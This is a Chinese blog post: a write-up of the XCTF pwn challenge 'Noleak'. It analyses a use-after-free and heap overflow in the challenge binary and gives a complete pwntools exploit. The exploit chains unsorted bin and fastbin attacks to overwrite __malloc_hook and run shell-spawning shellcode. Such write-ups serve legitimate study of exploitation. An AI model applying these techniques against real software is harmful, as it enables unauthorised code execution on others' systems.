<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Noleak"><meta name="keywords" content="pwn,ctf"><meta name="author" content="Soinux"><meta name="copyright" content="Soinux"><title>Noleak | Soinux's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#检查保护"><span class="toc-number">1.</span> <span class="toc-text">检查保护</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Soinux</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">2</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">2</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">2</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://www.baidu.com" target="_blank" rel="noopener">BestFriend</a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Soinux's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">Noleak</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-31</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/pwn/">pwn</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><blockquote>
<p>我是一条小咸鱼~~~ 小咸鱼~~~</p>
</blockquote>
<h1 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">soinux@Caiji:~/ctf/xctf/pwn/noleak$ checksec timu</span><br><span class="line">[*] <span class="string">'/home/soinux/ctf/xctf/pwn/noleak/timu'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<ul>
<li>开了Full RELRO, 不能快乐的改写got表了</li>
</ul>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>一共三种操作 create，delete 和 update :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"Index: "</span>, <span class="number">7u</span>);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">9</span> )</span><br><span class="line">    <span class="built_in">free</span>(buf[v0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>存在UAF 和 double free漏洞 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">upd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> nbytes; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">"Index: "</span>, <span class="number">7u</span>);</span><br><span class="line">  LODWORD(v0) = get_num();</span><br><span class="line">  v3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0 &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = buf[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v0];</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"Size: "</span>, <span class="number">6u</span>);</span><br><span class="line">      nbytes = get_num();</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">"Data: "</span>, <span class="number">6u</span>);</span><br><span class="line">      LODWORD(v0) = <span class="built_in">read</span>(<span class="number">0</span>, buf[v3], nbytes);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>nbytes大小未限制，可进行堆溢出攻击</li>
</ul>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>有UAF可以实现任意地址写， 但got表只读，要另辟蹊径，改写__malloc_hook, __malloc_hook 在 unsortedbin 附近， 动态调试如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">r = process(<span class="string">'./timu'</span>)</span><br><span class="line"><span class="comment">#打印进程号，便于gdb attach 进程</span></span><br><span class="line">print(<span class="string">'PID: '</span> + str(proc.pidof(r)[<span class="number">0</span>]))</span><br><span class="line">print(proc.pidof(r))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cre</span><span class="params">(size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'1'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(idx)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'2'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upd</span><span class="params">(idx, size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'3'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line"><span class="comment">#因为我的本地环境glibc版本高于2.26(与远程环境不同)</span></span><br><span class="line"><span class="comment">#所以存在tache，要先把tache填满后再free才能加入unsorted bin</span></span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">cre(<span class="number">0x80</span>, <span class="string">'\n'</span>)</span><br><span class="line">delt(<span class="number">0</span>)</span><br><span class="line">delt(<span class="number">1</span>)</span><br><span class="line">delt(<span class="number">2</span>)</span><br><span class="line">delt(<span class="number">3</span>)</span><br><span class="line">delt(<span class="number">4</span>)</span><br><span class="line">delt(<span class="number">5</span>)</span><br><span class="line">delt(<span class="number">6</span>)</span><br><span class="line">delt(<span class="number">7</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; attach xxxx</span><br><span class="line">pwndbg&gt; unsortedbin</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x153c680 —▸ 0x7f15684a0be0 (main_arena+96) ◂— add    dh, 0x53 /* 0x153c680 */</span><br></pre></td></tr></table></figure>

<p>根据unsortedbin块的fd指针找到unsortedbin地址为0x7f1564a0be0 查看附近地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x7f15684a0b60</span><br><span class="line">0x7f15684a0b60 &lt;__memalign_hook&gt;:	0x00007f15683535a0	0x00007f1568353c20</span><br><span class="line">0x7f15684a0b70 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f15684a0b80 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f15684a0b90 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f15684a0ba0 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<ul>
<li>因为本机libc库版本不同，以上地址并不准确，根据题目附带的libc库得到的实际情况是__malloc_hook地址后3位十六进制数为0xb10，unsortedbin地址后3位十六进制数为0xb78</li>
</ul>
<p>根据内存的页载入机制，某条指令的后3个十六进制数字的是始终不变的，所以只需要利用unsorted bin attack 将unsorted bin 地址写入buf数组，再利用fastbin attack将unsorted bin 地址最后一位修改为0x10，即可得到__malloc_hook地址，并可以对该地址内容进行修改，修改 unsorted bin 的同时可以进行shellcode部署。</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>,arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#r = remote(host='111.198.29.45', port=33138)</span></span><br><span class="line">r = process(<span class="string">'./timu'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cre</span><span class="params">(size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'1'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delt</span><span class="params">(idx)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'2'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upd</span><span class="params">(idx, size, data)</span>:</span></span><br><span class="line">  r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'3'</span>)</span><br><span class="line">  r.sendlineafter(<span class="string">'Index: '</span>, str(idx))</span><br><span class="line">  r.sendlineafter(<span class="string">'Size: '</span>, str(size))</span><br><span class="line">  r.sendlineafter(<span class="string">'Data: '</span>, data)</span><br><span class="line">buf_addr = <span class="number">0x601040</span></span><br><span class="line">unsorted_sz = <span class="number">0x80</span></span><br><span class="line">fast_sz = <span class="number">0x60</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cre(unsorted_sz, <span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#在unsorted bin attack 之前申请用于fastbin attack 的chunk，</span></span><br><span class="line">cre(fast_sz, <span class="string">'\n'</span>)</span><br><span class="line">delt(<span class="number">0</span>)</span><br><span class="line">upd(<span class="number">0</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(buf_addr + <span class="number">0x30</span> - <span class="number">0x10</span>))</span><br><span class="line">cre(unsorted_sz, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>

<p>unsorted bin attack 将unsorted bin 地址写入 buf_addr + 0x30 处 即写入buf[6],这里需要注意，用于fastbin attack 的chunk 要在unsorted bin attack 之前进行申请，否则会出错.但这是为什么呢？？！ 先记录一下报错:<br>    <strong>* Error in `./timu’: malloc(): memory corruption (fast): 0x000000000060107d *</strong><br>该死的tcache毁掉了我本地动态调试的梦想，淦，我又懒得换环境，有空学学docker再来解决这个疑问。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delt(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line">upd(<span class="number">1</span>, <span class="number">0x8</span>, p64(buf_addr + <span class="number">0x2d</span>))</span><br><span class="line">cre(fast_sz, <span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#将buf_addr + 0x30 写入 buf[8], buf_addr + 0x90 写入 buf[9]</span></span><br><span class="line">cre(fast_sz, <span class="string">b'\x00'</span> * <span class="number">3</span> + p64(buf_addr + <span class="number">0x30</span>) + p64(buf_addr + <span class="number">0x90</span>))</span><br></pre></td></tr></table></figure>

<p>fastbin attack 只需要绕过对size的检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)   ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。</span></span><br><span class="line">    <span class="comment">// 根据取得的 victim ，利用 chunksize 计算其大小。</span></span><br><span class="line">    <span class="comment">// 利用fastbin_index 计算 chunk 的索引。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">        errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">    errout:</span><br><span class="line">        malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>而以buf_addr + 0x2d = 0x60106d伪造的chunck的size字段大小为0x71 而我们之前申请的chunk 的 chunk_sz = 0x60 + 0x10 = 0x70 (不计符号位)，刚好符合检查条件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#*((char *)buf[8]) = '\x10'</span></span><br><span class="line">upd(<span class="number">8</span>, <span class="number">1</span>, <span class="string">'\x10'</span>)</span><br><span class="line"><span class="comment">#修改__malloc_hook 内容为shellcode的地址</span></span><br><span class="line">upd(<span class="number">6</span>, <span class="number">8</span>, p64(buf_addr + <span class="number">0x90</span>))</span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line"><span class="comment">#部署shellcode 到 buf_addr + 0x90</span></span><br><span class="line">upd(<span class="number">9</span>, len(shellcode), shellcode)</span><br><span class="line">r.sendlineafter(<span class="string">'Your choice :'</span>, <span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'Size: '</span>, <span class="string">'1'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Soinux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://soinux.github.io/2020/03/31/Noleak/">http://soinux.github.io/2020/03/31/Noleak/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://soinux.github.io">Soinux's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2020/03/19/note-service2/"><span>note-service2</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By Soinux</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/ Relative)","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":100,"height":180},"mobile":{"show":false},"react":{"opacityDefault":0}});</script></body></html>